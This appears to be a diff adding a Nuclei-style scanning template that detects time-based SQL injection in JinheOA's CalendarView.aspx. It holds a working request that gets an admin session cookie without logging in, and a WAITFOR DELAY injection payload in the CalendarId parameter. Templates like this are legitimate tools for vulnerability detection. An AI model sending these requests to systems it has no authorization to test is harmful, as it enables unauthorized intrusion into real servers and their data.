@@ -1,0 +1,54 @@
+id: poc-yaml-jinher-jhsoft-calendarview-aspx-sqli
+info:
+  name: JinheOA CalendarView.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in JinheOA CalendarView.aspx which allows for time-based SQL injection via the CalendarId parameter.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1)+2}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: session-cookie-fetch
+    method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.calendar/public/Print1.aspx/?UserCode=admin"
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        group: 1
+        part: header
+        regex:
+          - "ASP\\.NET_SessionId=(.*?);"
+
+  - id: sql-injection-check
+    method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.Calendar/CalendarView.aspx?CalendarId=1'waitfor+delay%270:0:{{t1}}%27--"
+    headers:
+      Cookie: "ASP.NET_SessionId={{cookie}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "日程查看"
+          - "打印"
+          - "导出"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
